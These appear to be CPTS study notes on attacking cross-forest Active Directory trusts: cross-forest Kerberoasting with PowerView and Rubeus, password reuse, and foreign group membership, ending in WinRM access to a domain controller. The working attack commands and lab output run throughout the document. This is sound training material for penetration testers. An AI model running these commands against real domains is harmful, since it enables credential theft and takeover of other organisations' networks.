# Attacking Domain Trusts — Cross-Forest Trust Abuse — from Windows

> [!info] Core Idea  
> A bidirectional forest trust can create attack paths between otherwise separate AD environments. Once you compromise one domain, you should enumerate the trusted forest for **Kerberoastable privileged accounts, password reuse, and foreign group membership**.

---

# 💻 COMMAND CHEAT SHEET

> [!card] PowerView — Cross-Forest AD Enumeration  
> PowerView is used to enumerate users, SPNs, group membership, and foreign security principals across a trusted domain.
> 
> > [!code-card] FIND USERS WITH SPNs IN TARGET DOMAIN
> > 
> > ```powershell
> > Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
> > ```
> 
> > [!code-card] ENUMERATE TARGET USER MEMBERSHIP
> > 
> > ```powershell
> > Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
> > ```
> 
> > [!code-card] ENUMERATE FOREIGN GROUP MEMBERS
> > 
> > ```powershell
> > Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
> > ```
> 
> > [!code-card] RESOLVE SID TO DOMAIN ACCOUNT
> > 
> > ```powershell
> > Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
> > ```

> [!card] Rubeus — Cross-Forest Kerberoasting  
> Rubeus can request Kerberos service tickets from a trusted target domain by specifying the target domain with `/domain`.
> 
> > [!code-card] KERBEROAST TARGET ACCOUNT ACROSS TRUST
> > 
> > ```powershell
> > .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
> > ```

> [!card] Enter-PSSession — Cross-Forest WinRM Access  
> PowerShell Remoting can be used to authenticate to a trusted domain using credentials from the other domain when the necessary group membership exists.
> 
> > [!code-card] CONNECT TO TARGET DC
> > 
> > ```powershell
> > Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
> > ```
> 
> > [!code-card] VERIFY CURRENT IDENTITY
> > 
> > ```powershell
> > whoami
> > ```
> 
> > [!code-card] ENUMERATE TARGET HOST NETWORK CONFIGURATION
> > 
> > ```powershell
> > ipconfig /all
> > ```

---

# 🌳 Cross-Forest Trust Abuse

A forest trust can allow authentication and authorization relationships to cross forest boundaries.

The important assessment question is:

> **"If I compromise Domain A, what can that trust relationship give me in Domain B?"**

The source focuses on three practical attack paths:

```text
Compromise Domain A
        │
        ▼
Bidirectional Forest Trust
        │
        ├── 🔑 Cross-Forest Kerberoasting
        │       ↓
        │   Crack privileged account
        │
        ├── 🔄 Password Reuse
        │       ↓
        │   Reuse credentials in Domain B
        │
        └── 👥 Foreign Group Membership
                ↓
            Existing admin rights
                │
                ▼
        Domain B Compromise
```

> [!important] Trust Direction Matters  
> Kerberos attacks such as **Kerberoasting** and **ASREPRoasting** can potentially be performed across trusts depending on the **trust direction**.
> 
> The source specifically focuses on situations involving an **inbound or bidirectional domain/forest trust**.

---

# 🔥 1. Cross-Forest Kerberoasting

One of the first things to check after compromising a domain involved in a trust is whether the trusted domain contains **Kerberoastable accounts with valuable privileges**.

The source highlights an important scenario:

```text
Domain A compromised
       ↓
Cannot escalate further in Domain A
       ↓
Trusted Domain B
       ↓
Find privileged SPN account
       ↓
Kerberoast
       ↓
Crack hash offline
       ↓
Obtain Domain/Enterprise Admin credentials
       ↓
Domain B compromise
```

This means that being unable to escalate in your current domain **does not necessarily mean the assessment has reached a dead end**.

---

# 🔎 2. Find SPN-Associated Accounts in the Target Domain

PowerView can enumerate users with associated SPNs in another domain.

```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

The source returns:

```text
samaccountname
--------------
krbtgt
mssqlsvc
```

The important account is:

```text
mssqlsvc
```

because it has an SPN and therefore becomes a potential Kerberoasting target.

> [!tip] Assessment Mindset  
> Don't stop at:
> 
> **"I found an SPN."**
> 
> Immediately ask:
> 
> **"What privileges does this account have?"**

A Kerberoastable low-privileged account may be interesting, but a Kerberoastable **Domain Admin** can completely change the attack path.

---

# 👑 3. Determine the Account's Group Membership

Use PowerView to inspect the `mssqlsvc` account:

```powershell
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```

Output:

```text
samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

This gives us the critical relationship:

```text
mssqlsvc
   │
   ├── Has SPN
   │
   └── Member of Domain Admins
```

> [!success] High-Value Target  
> `mssqlsvc` is particularly valuable because it combines:
> 
> **Kerberoastable + Domain Admin**
> 
> If the password can be recovered from the Kerberos service-ticket hash, the attacker gains administrative access to the target domain.

---

# 🎫 4. Kerberoast the Target Domain with Rubeus

Rubeus can perform the Kerberoasting attack against the trusted domain.

The important difference from a normal Kerberoast is:

```text
/domain:FREIGHTLOGISTICS.LOCAL
```

This tells Rubeus which target domain to query.

Command:

```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

The source shows:

```text
[*] Action: Kerberoasting

[*] Target User            : mssqlsvc
[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
```

Rubeus searches the target domain's LDAP directory:

```text
LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL
```

and identifies:

```text
[*] Total kerberoastable users : 1

[*] SamAccountName         : mssqlsvc
[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
[*] Supported ETypes       : RC4_HMAC_DEFAULT
```

The resulting Kerberos TGS hash begins with:

```text
$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$...
```

---

# 🧠 5. Why the `/domain` Flag Matters

Normally, Kerberoasting operates against the domain you're currently working within.

Here, the target account exists in:

```text
FREIGHTLOGISTICS.LOCAL
```

while the attacker is positioned in another trusted domain.

The workflow therefore becomes:

```text
Current Domain
      │
      │ Forest Trust
      ▼
FREIGHTLOGISTICS.LOCAL
      │
      ▼
LDAP enumeration
      │
      ▼
mssqlsvc
      │
      ▼
Kerberos TGS request
      │
      ▼
$krb5tgs$23$...
```

> [!important] Key Concept  
> The trust can provide a path for authentication and Kerberos operations across domain boundaries. The source demonstrates abusing that relationship to request a service ticket for a privileged account in the other domain.

---

# 🔐 6. Crack the Kerberos Hash Offline

Once the TGS hash is obtained, it can be attacked offline with a password-cracking tool such as Hashcat.

The source's key point is not the cracking syntax itself, but the consequence:

```text
Cross-Forest Kerberoasting
        ↓
TGS hash
        ↓
Offline password cracking
        ↓
mssqlsvc password
        ↓
Domain Admin
        ↓
Target-domain compromise
```

> [!success] Why This Is Powerful  
> The attacker did **not** need to escalate privileges inside the original domain.
> 
> Instead:
> 
> **Compromise Domain A → abuse trust → attack privileged account in Domain B.**

---

# 🌲 7. Admin Password Reuse Across Forests

Another attack path exists when the same organization manages both forests.

The source describes a situation where:

```text
Domain A
└── Highly privileged account
        │
        │ Same password
        ▼
Domain B
└── Highly privileged account
```

For example, Domain A could contain:

```text
adm_bob.smith
```

while Domain B could contain:

```text
bsmith_admin
```

Even though the usernames are different, administrators may reuse the same password.

If you obtain:

- Cleartext passwords, or
    
- NT hashes
    

for a highly privileged account in Domain A, it is worth checking whether those credentials work against privileged accounts in Domain B.

---

# 🧠 8. Why Password Reuse Is Worth Checking

Suppose you compromise:

```text
INLANEFREIGHT.LOCAL
```

and obtain credentials for:

```text
INLANEFREIGHT\administrator
```

If the administrators of the two forests reuse credentials, those credentials may potentially authenticate to a privileged account or service in:

```text
FREIGHTLOGISTICS.LOCAL
```

The attack becomes:

```text
Domain A compromise
       ↓
Credential extraction
       ↓
Identify privileged accounts
       ↓
Check credential reuse
       ↓
Authenticate across trust
       ↓
Domain B compromise
```

> [!warning] Important  
> Password reuse should be treated as an **assessment hypothesis to test within scope**, not an assumption that credentials are shared simply because a trust exists.

---

# 👥 9. Foreign Group Membership

The third major attack path is **foreign group membership**.

A user from one domain can appear as a member of a group in another domain.

The source specifically points out an important AD rule:

> **Domain Local Groups** can contain security principals from outside their forest.

This means you may discover relationships such as:

```text
INLANEFREIGHT\administrator
             │
             ▼
FREIGHTLOGISTICS.LOCAL
             │
             ▼
Administrators
```

If that account is compromised, its existing membership can immediately provide administrative access in the second domain.

---

# 🔍 10. Enumerate Foreign Group Membership with PowerView

PowerView provides:

```powershell
Get-DomainForeignGroupMember
```

The source runs:

```powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```

The important result is:

```text
GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL

MemberDomain            : FREIGHTLOGISTICS.LOCAL

MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500

MemberDistinguishedName :
CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGISTICS,DC=LOCAL
```

The interesting part is the SID:

```text
S-1-5-21-3842939050-3880317879-2865463114-500
```

---

# 🆔 11. Convert the SID to a Name

Use:

```powershell
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
```

Output:

```text
INLANEFREIGHT\administrator
```

Now the relationship becomes obvious:

```text
INLANEFREIGHT\administrator
          │
          ▼
FREIGHTLOGISTICS.LOCAL
          │
          ▼
Administrators
```

> [!important] What `ForeignSecurityPrincipals` Tells You  
> When you see a SID represented under the `ForeignSecurityPrincipals` container, it can indicate that an identity originating outside the local domain has been granted access through a local group relationship.

---

# 🚪 12. Verify Access with WinRM

The source verifies that the foreign membership actually provides access using PowerShell Remoting.

```powershell
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

A remote PowerShell session is established:

```text
[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]:
PS C:\Users\administrator.INLANEFREIGHT\Documents>
```

The source then verifies the identity:

```powershell
whoami
```

Output:

```text
inlanefreight\administrator
```

---

# 🖥️ 13. Verify the Target Host

The source also runs:

```powershell
ipconfig /all
```

The important result identifies the machine as:

```text
Host Name:
ACADEMY-EA-DC03

Primary DNS Suffix:
FREIGHTLOGISTICS.LOCAL
```

This confirms that the session is running on the Domain Controller in the target forest.

---

# 🔗 14. The Trust Abuse Chain

The complete scenario can be visualized as:

```text
┌──────────────────────────────┐
│ INLANEFREIGHT.LOCAL          │
│                              │
│ Compromised Domain           │
│                              │
│ INLANEFREIGHT\administrator   │
└──────────────┬───────────────┘
               │
               │ Bidirectional
               │ Forest Trust
               ▼
┌──────────────────────────────┐
│ FREIGHTLOGISTICS.LOCAL       │
│                              │
│ ┌──────────────────────────┐ │
│ │ Attack Path #1           │ │
│ │ Cross-Forest Kerberoast  │ │
│ └─────────────┬────────────┘ │
│               ▼              │
│       mssqlsvc               │
│       Domain Admin           │
│               │              │
│               ▼              │
│        Crack TGS hash        │
│                              │
│ ┌──────────────────────────┐ │
│ │ Attack Path #2           │ │
│ │ Password Reuse            │ │
│ └─────────────┬────────────┘ │
│               ▼              │
│       Reused credentials     │
│                              │
│ ┌──────────────────────────┐ │
│ │ Attack Path #3           │ │
│ │ Foreign Group Membership │ │
│ └─────────────┬────────────┘ │
│               ▼              │
│       Administrators         │
│               │              │
│               ▼              │
│          DC03 / WinRM        │
└──────────────────────────────┘
```

---

# 🧭 15. CPTS Assessment Methodology

> [!card] Step 1 — Identify Trusts  
> Determine whether the compromised domain has relationships with another domain or forest.
> 
> **Question:** Is the trust inbound, outbound, or bidirectional?

> [!card] Step 2 — Enumerate the Trusted Domain  
> Don't limit enumeration to your current domain.
> 
> Look for:
> 
> - Users
>     
> - SPNs
>     
> - Privileged accounts
>     
> - Group membership
>     
> - Foreign group membership
>     

> [!card] Step 3 — Look for Kerberoastable Privileged Accounts  
> Use PowerView to identify SPNs in the trusted domain:
> 
> ```powershell
> Get-DomainUser -SPN -Domain <TARGET-DOMAIN>
> ```
> 
> Then determine whether those accounts have valuable group membership.

> [!card] Step 4 — Check Password Reuse  
> If privileged credentials or hashes are obtained, consider whether the same credentials are reused across the trusted forests, where authorized.

> [!card] Step 5 — Enumerate Foreign Group Membership
> 
> ```powershell
> Get-DomainForeignGroupMember -Domain <TARGET-DOMAIN>
> ```
> 
> Look for privileged groups such as:
> 
> ```text
> Administrators
> Domain Admins
> Enterprise Admins
> ```

> [!card] Step 6 — Resolve Interesting SIDs
> 
> ```powershell
> Convert-SidToName <SID>
> ```
> 
> Determine exactly which external account has been granted access.

> [!card] Step 7 — Verify the Attack Path  
> If the credentials and authorization relationship are valid, verify access using an appropriate authorized service such as WinRM.

---

# 🧠 16. Three Things to Think About After a Forest Trust

When you compromise **Domain A** and discover a **bidirectional forest trust** with **Domain B**, immediately think:

```text
                 BIDIRECTIONAL TRUST
                         │
          ┌──────────────┼──────────────┐
          ▼              ▼              ▼
      🔥 SPNs       🔑 Credentials     👥 Groups
          │              │              │
     Kerberoast       Reuse          Foreign
          │              │          Membership
          ▼              ▼              ▼
     Crack hash       Login        Existing
          │              │          privileges
          └──────────────┼──────────────┘
                         ▼
                DOMAIN B ACCESS
```

This is the practical mental model to retain.

---

# ⚠️ 17. Common Mistake

> [!warning] Don't Treat a Trust as "Just Connectivity"  
> A forest trust isn't merely a network route between two environments.
> 
> It can create **authentication and authorization relationships** that introduce attack paths.
> 
> After compromising one side, ask:
> 
> **"What identities from my domain are trusted by the other domain, and what identities in the other domain can I authenticate to or attack?"**

---

# 🎯 18. Key Takeaways

> [!success]
> 
> - Kerberoasting can potentially be performed across trusts depending on trust direction.
>     
> - A bidirectional forest trust can expose attack paths into another domain.
>     
> - PowerView's `Get-DomainUser -SPN -Domain` can enumerate SPN-associated accounts in the trusted domain.
>     
> - Always investigate the privileges of a discovered SPN account.
>     
> - A Kerberoastable **Domain Admin** is a particularly high-value target.
>     
> - Rubeus can target another domain using `/domain:<TARGET-DOMAIN>`.
>     
> - The resulting TGS hash can be cracked offline.
>     
> - Password reuse between forests is another potential escalation path.
>     
> - Different usernames do not necessarily mean different passwords.
>     
> - Domain Local Groups can contain security principals from outside their forest.
>     
> - `Get-DomainForeignGroupMember` can enumerate foreign group membership.
>     
> - `Convert-SidToName` can resolve an interesting SID to its originating account.
>     
> - Foreign membership in the target domain's `Administrators` group can provide administrative access.
>     
> - `Enter-PSSession` can be used to verify cross-domain WinRM access when the required authorization exists.
>     
> - After compromising one side of a bidirectional trust, **always investigate the other side if it is in scope**.
>     

---

# 🧠 CPTS Exam Mental Model

> [!important] **COMPROMISED DOMAIN → TRUST → LOOK OUTSIDE YOUR DOMAIN**
> 
> ```text
> Domain A compromised
>          │
>          ▼
> Bidirectional Forest Trust?
>          │
>          ├── YES ──► Enumerate Domain B
>          │
>          │
>          ├── SPNs?
>          │     ↓
>          │  Privileged account?
>          │     ↓
>          │  Cross-Forest Kerberoast
>          │
>          ├── Credential reuse?
>          │     ↓
>          │  Test authorized privileged paths
>          │
>          └── Foreign group membership?
>                ↓
>             Resolve SID
>                ↓
>          Does compromised user
>          belong to privileged group?
>                ↓
>             Verify access
>                ↓
>          Domain B compromise
> ```
> 
> **The trust itself may be the attack path.**